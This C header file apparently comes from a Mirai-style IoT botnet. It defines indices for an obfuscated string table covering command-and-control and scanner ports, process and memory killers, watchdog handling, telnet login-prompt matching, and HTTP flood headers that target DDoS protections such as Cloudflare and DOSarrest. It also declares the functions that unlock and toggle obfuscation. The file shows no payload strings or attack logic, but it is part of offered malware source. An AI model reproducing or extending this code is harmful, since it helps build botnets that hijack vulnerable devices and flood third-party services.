#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};


		/* exec or nah*/ 
#define TABLE_EXEC_SUCCESS					 1
#define TABLE_INSTANCE_EXISTS	 			 2
		/* connections shit */
//#define TABLE_CNC_DOMAIN					 3
//#define TABLE_SCAN_DOMAIN					 4
#define TABLE_CNC_PORT 						 5
#define TABLE_SCAN_CB_PORT					 6
		/* killer */
#define TABLE_KILLER_PROC					 7
#define TABLE_KILLER_EXE					 8
#define TABLE_KILLER_FD						 9
#define TABLE_KILLER_MAPS					10
#define TABLE_KILLER_TCP					11
		/* memorykiller!! */
#define TABLE_MEM_1 						12
#define TABLE_MEM_2 						13
#define TABLE_MEM_3 						14
#define TABLE_MEM_4 						15
#define TABLE_MEM_5 						16
#define TABLE_MEM_6 						17
#define TABLE_MEM_7 						18
#define TABLE_MEM_8 						19
#define TABLE_MEM_9 						20
#define TABLE_MEM_10 						21
#define TABLE_MEM_11 						22
#define TABLE_MEM_12 						23
#define TABLE_MEM_13 						24
#define TABLE_MEM_14 						25
#define TABLE_MEM_15 						26
#define TABLE_MEM_16 						27
#define TABLE_MEM_17 						28
#define TABLE_MEM_18 						29
#define TABLE_MEM_19 						30
#define TABLE_MEM_20 						31
#define TABLE_MEM_21 						32
#define TABLE_MEM_22 						33
#define TABLE_MEM_23 						34
#define TABLE_MEM_24 						35
#define TABLE_MEM_25 						36
#define TABLE_MEM_26 						37
#define TABLE_MEM_27 						38
#define TABLE_MEM_28 						39
#define TABLE_MEM_29 						40
#define TABLE_MEM_30 						41
#define TABLE_MEM_31 						42
#define TABLE_MEM_32 						43
#define TABLE_MEM_33 						44
#define TABLE_MEM_34 						45
#define TABLE_MEM_35 						46
#define TABLE_MEM_36 						47
#define TABLE_MEM_37 						48
#define TABLE_MEM_38 						49
#define TABLE_MEM_39 						50
#define TABLE_MEM_40 						51
			/* watchdog */
#define TABLE_MISC_WATCHDOG_1				52
#define TABLE_MISC_WATCHDOG_2 				53
#define TABLE_MISC_WATCHDOG_3 				54
#define TABLE_MISC_WATCHDOG_4 				55
#define TABLE_MISC_WATCHDOG_5 				56
#define TABLE_MISC_WATCHDOG_6 				57
#define TABLE_MISC_WATCHDOG_7 				58
#define TABLE_MISC_WATCHDOG_8 				59
#define TABLE_MISC_WATCHDOG_9 				60
            /* scanner */
#define TABLE_SCAN_SHELL					61
#define TABLE_SCAN_ENABLE 					62
#define TABLE_SCAN_SYSTEM 					63
#define TABLE_SCAN_SH 						64
#define TABLE_SCAN_QUERY 					65
#define TABLE_SCAN_RESP 					66
#define TABLE_SCAN_NCORRECT 				67
#define TABLE_SCAN_ASSWORD 					68
#define TABLE_SCAN_OGIN 					69
#define TABLE_SCAN_ENTER 					70
#define TABLE_SCAN_POST 					71
#define TABLE_SCAN_CONTENTLEN 				72
#define TABLE_SCAN_CONNECTION 				73
#define TABLE_SCAN_ACCEPT 					74
#define TABLE_SCAN_AUTH 					75
#define TABLE_SCAN_HEADER 					76
#define TABLE_SCAN_HEADER2 					77
		/* attack */
#define TABLE_ATK_VSE           	        78
#define TABLE_ATK_RESOLVER              	79
#define TABLE_ATK_NSERV                 	80
#define TABLE_ATK_KEEP_ALIVE            	81
#define TABLE_ATK_ACCEPT                	82
#define TABLE_ATK_ACCEPT_LNG            	83
#define TABLE_ATK_CONTENT_TYPE          	84
#define TABLE_ATK_SET_COOKIE            	85
#define TABLE_ATK_REFRESH_HDR           	86
#define TABLE_ATK_LOCATION_HDR          	87
#define TABLE_ATK_SET_COOKIE_HDR        	88
#define TABLE_ATK_CONTENT_LENGTH_HDR    	89
#define TABLE_ATK_TRANSFER_ENCODING_HDR 	90
#define TABLE_ATK_CHUNKED               	91
#define TABLE_ATK_KEEP_ALIVE_HDR        	92
#define TABLE_ATK_CONNECTION_HDR        	93
#define TABLE_ATK_DOSARREST             	94
#define TABLE_ATK_CLOUDFLARE_NGINX      	95
#define TABLE_ATK_HTTP						96
#define TABLE_ATK_USERAGENT 				97
#define TABLE_ATK_HOST						98
#define TABLE_ATK_COOKIE					99
#define TABLE_ATK_SEARCHHTTP				100
#define TABLE_ATK_URL                   	101
#define TABLE_ATK_POST						102
		/* UA */
#define TABLE_HTTP_1                  		103
#define TABLE_HTTP_2                  		104
#define TABLE_HTTP_3                		105
#define TABLE_HTTP_4                 		106
#define TABLE_HTTP_5                 		107
#define TABLE_HTTP_6                 		108
#define TABLE_HTTP_7                 		109
#define TABLE_HTTP_8                 		110
#define TABLE_HTTP_9                 		111
#define TABLE_HTTP_10                 		112
		/* fuck this world */
#define TABLE_RANDOM 						113





#define TABLE_MAX_KEYS 						122

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
